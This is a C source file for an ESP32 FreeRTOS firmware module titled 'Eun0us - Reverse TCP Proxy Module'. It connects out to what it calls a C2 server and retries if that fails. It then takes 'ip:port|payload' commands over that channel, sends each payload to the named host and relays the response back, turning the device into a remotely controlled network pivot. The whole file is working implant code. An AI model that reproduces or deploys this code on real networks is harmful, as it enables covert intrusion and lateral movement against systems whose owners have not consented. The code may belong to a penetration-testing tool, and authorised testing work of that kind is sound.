/*
 * Eun0us - Reverse TCP Proxy Module
 * Clean & stream-based implementation
 */

 #include <stdio.h>
 #include <string.h>
 #include <stdlib.h>
 #include <errno.h>
 #include <unistd.h>
 
 #include <sys/socket.h>
 #include <netinet/in.h>
 #include <arpa/inet.h>
 
 #include "freertos/FreeRTOS.h"
 #include "freertos/task.h"
 #include "esp_log.h"
 
 #include "utils.h"
 
 #define TAG "PROXY"
 
 #define MAX_PROXY_RETRY 10
 #define RETRY_DELAY_MS 5000
 #define CMD_BUF_SIZE   256
 #define RX_BUF_SIZE    1024
 
 int proxy_running = 0;
 static int cc_client = -1;
 
 /* ============================================================
  * Helpers
  * ============================================================ */
 
 /* Replace escaped \r \n */
 static void unescape_payload(const char *src, char *dst, size_t max_len)
 {
     size_t i = 0, j = 0;
     while (src[i] && j < max_len - 1) {
         if (src[i] == '\\' && src[i + 1] == 'r') {
             dst[j++] = '\r';
             i += 2;
         } else if (src[i] == '\\' && src[i + 1] == 'n') {
             dst[j++] = '\n';
             i += 2;
         } else {
             dst[j++] = src[i++];
         }
     }
     dst[j] = '\0';
 }
 
 /* ============================================================
  * Proxy command handler task
  * ============================================================ */
 
 static void proxy_task(void *arg)
 {
     (void)arg;
 
     char cmd[CMD_BUF_SIZE];
 
     msg_info(TAG, "proxy handler started", NULL);
 
     while (proxy_running) {
 
         int len = recv(cc_client, cmd, sizeof(cmd) - 1, 0);
         if (len <= 0) {
             msg_error(TAG, "connection closed", NULL);
             break;
         }
         cmd[len] = '\0';
 
         /* Format: ip:port|payload */
         char *sep_ip  = strchr(cmd, ':');
         char *sep_pay = strchr(cmd, '|');
 
         if (!sep_ip || !sep_pay || sep_pay <= sep_ip) {
             msg_error(TAG, "invalid command format", NULL);
             continue;
         }
 
         /* Extract IP */
         char ip[64];
         size_t ip_len = sep_ip - cmd;
         if (ip_len >= sizeof(ip)) {
             msg_error(TAG, "ip too long", NULL);
             continue;
         }
         memcpy(ip, cmd, ip_len);
         ip[ip_len] = '\0';
 
         /* Extract port */
         int port = atoi(sep_ip + 1);
         if (port <= 0 || port > 65535) {
             msg_error(TAG, "invalid port", NULL);
             continue;
         }
 
         const char *payload_escaped = sep_pay + 1;
 
         char info_msg[96];
         snprintf(info_msg, sizeof(info_msg),
                  "proxying to %s:%d", ip, port);
         msg_info(TAG, info_msg, NULL);
 
         /* Destination socket */
         int dst = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
         if (dst < 0) {
             msg_error(TAG, "socket failed", NULL);
             continue;
         }
 
         struct sockaddr_in addr = {
             .sin_family = AF_INET,
             .sin_port   = htons(port),
             .sin_addr.s_addr = inet_addr(ip),
         };
 
         struct timeval timeout = { .tv_sec = 5, .tv_usec = 0 };
         setsockopt(dst, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout));
         setsockopt(dst, SOL_SOCKET, SO_SNDTIMEO, &timeout, sizeof(timeout));
 
         if (connect(dst, (struct sockaddr *)&addr, sizeof(addr)) != 0) {
             msg_error(TAG, "connect failed", NULL);
             close(dst);
             continue;
         }
 
         /* Send payload */
         char payload[RX_BUF_SIZE];
         unescape_payload(payload_escaped, payload, sizeof(payload));
         send(dst, payload, strlen(payload), 0);
 
         /* Receive response (stream) */
         char rx[RX_BUF_SIZE];
         while ((len = recv(dst, rx, sizeof(rx), 0)) > 0) {
             msg_data(TAG, rx, len, false, NULL);
         }
 
         /* End of stream */
         msg_data(TAG, NULL, 0, true, NULL);
 
         close(dst);
     }
 
     close(cc_client);
     cc_client = -1;
     proxy_running = 0;
 
     msg_info(TAG, "proxy stopped", NULL);
     vTaskDelete(NULL);
 }
 
 /* ============================================================
  * Public API
  * ============================================================ */
 
 void init_proxy(char *ip, int port)
 {
     struct sockaddr_in server = {
         .sin_family = AF_INET,
         .sin_port   = htons(port),
         .sin_addr.s_addr = inet_addr(ip),
     };
 
     for (int retry = 0; retry < MAX_PROXY_RETRY; retry++) {
 
         cc_client = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
         if (cc_client < 0) {
             vTaskDelay(pdMS_TO_TICKS(RETRY_DELAY_MS));
             continue;
         }
 
         msg_info(TAG, "connecting to C2...", NULL);
 
         if (connect(cc_client,
                     (struct sockaddr *)&server,
                     sizeof(server)) == 0) {
 
             proxy_running = 1;
             xTaskCreate(
                 proxy_task,
                 "proxy_task",
                 8192,
                 NULL,
                 5,
                 NULL
             );
             return;
         }
 
         close(cc_client);
         vTaskDelay(pdMS_TO_TICKS(RETRY_DELAY_MS));
     }
 
     msg_error(TAG, "unable to connect to C2", NULL);
 }
 